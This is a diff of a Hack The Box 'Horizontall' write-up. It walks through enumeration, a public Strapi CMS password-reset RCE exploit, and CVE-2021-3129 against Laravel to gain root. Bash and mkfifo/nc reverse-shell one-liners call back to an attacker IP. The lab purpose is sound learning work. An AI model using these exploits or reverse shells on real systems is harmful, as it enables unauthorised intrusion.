@@ -10,11 +10,10 @@ first add `horizontall.htb` to `/etc/hosts`
 
 ## Enumeration
 
-### nmap
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
 |   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
@@ -26,13 +25,12 @@ PORT   STATE SERVICE REASON  VERSION
 |_http-title: horizontall
 |_http-server-header: nginx/1.14.0 (Ubuntu)
 |_http-favicon: Unknown favicon MD5: 1BA2AE710D927F13D483FD5D1E548C9B
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### ffuf
-```
+```bash
                         [Status: 200, Size: 901, Words: 43, Lines: 2]
 css                     [Status: 301, Size: 194, Words: 7, Lines: 8]
 img                     [Status: 301, Size: 194, Words: 7, Lines: 8]
@@ -52,17 +50,16 @@ reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1]
 robots.txt              [Status: 200, Size: 121, Words: 19, Lines: 4]
 users                   [Status: 403, Size: 60, Words: 1, Lines: 1]
 
-
 ```
 
 hmm...little information
 
 Aaaaand I was stuck for yeeaaars!
 
-until I did a `vhost` enumeration with gobuster 
+until I did a `vhost` enumeration with gobuster
 
-```
-└──╼ $gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u http://horizontall.htb/ 
+```bash
+└──╼ $gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u http://horizontall.htb/
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -77,25 +74,20 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2021/12/06 14:30:04 Starting gobuster in VHOST enumeration mode
 ===============================================================
 Found: api-prod.horizontall.htb (Status: 200
-
 ```
 
 we add `api-prod.horizontall.htb` to our hosts too
-
 We get a welcome page now and there is nothing in source code...we fuzz that again
-
 The `admin` login page uses `strapi cms`
-
 the version can be found in the javascript file
 
-
 we exploit that
-```
+
+```bash
 └──╼ $python 50239.py http://api-prod.horizontall.htb
 [+] Checking Strapi CMS Version running
 [+] Seems like the exploit will work!!!
 [+] Executing exploit
-
 
 [+] Password reset was successfully
 [+] Your email is: admin@horizontall.htb
@@ -104,20 +96,21 @@ we exploit that
 ```
 And we get a shell on another listenner
 
-```
+```bash
 $> bash -c 'exec bash -i &>/dev/tcp/10.10.15.45/4444 <&1'
 [+] Triggering Remote code executin
 [*] Rember this is a blind RCE don't expect to see output
 ```
-For comfort
+For more comfort
 
-```
+```bash
 strapi@horizontall:~/myapi$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 Get flag
-```
+
+```bash
 strapi@horizontall:/home/developer$ ls
 ls
 composer-setup.php  myproject  user.txt
@@ -130,21 +123,21 @@ the_flag_of_patience_lol
 
 no password so we are very limited...we upload and use `linpeas` and found
 
-```
+```bash
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
-tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1847/node /usr/bin/ 
-tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 :::80                   :::*                    LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1847/node /usr/bin/
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
 ```
 And these
 
-```
-strapi@horizontall:~/myapi/config/environments/development$ cat database.json 
+```bash
+strapi@horizontall:~/myapi/config/environments/development$ cat database.json
 cat database.json
 {
   "defaultConnection": "default",
@@ -178,10 +171,9 @@ ssh portforward to our local port 8000
 And access `127.0.0.1:8000` in browser
 
 Oh its laravel `Laravel v8 (PHP v7.4.18) `
-
 there is `CVE-2021-3129_exploit` for that...find it on github
 
-```
+```bash
 └──╼ $./exploit.py http://localhost:8000 Monolog/RCE1 "uname -a"
 [i] Trying to clear logs
 [+] Logs cleared
@@ -203,7 +195,7 @@ Linux horizontall 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 202
 ```
 it works...we can get root now
 
-```
+```bash
 └──╼ $./exploit.py http://localhost:8000 Monolog/RCE1 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.45 2311 >/tmp/f"
 [i] Trying to clear logs
 [+] Logs cleared
@@ -214,8 +206,9 @@ it works...we can get root now
 ...
 
 ```
-And we get it on our listenner
-```
+And we get it on our listener
+
+```bash
 └──╼ $nc -lnvp 2311
 listening on [any] 2311 ...
 connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 42990
@@ -233,6 +226,4 @@ the_flag_of_dedication_kek
 ```
 
 room finito!
-
-
 
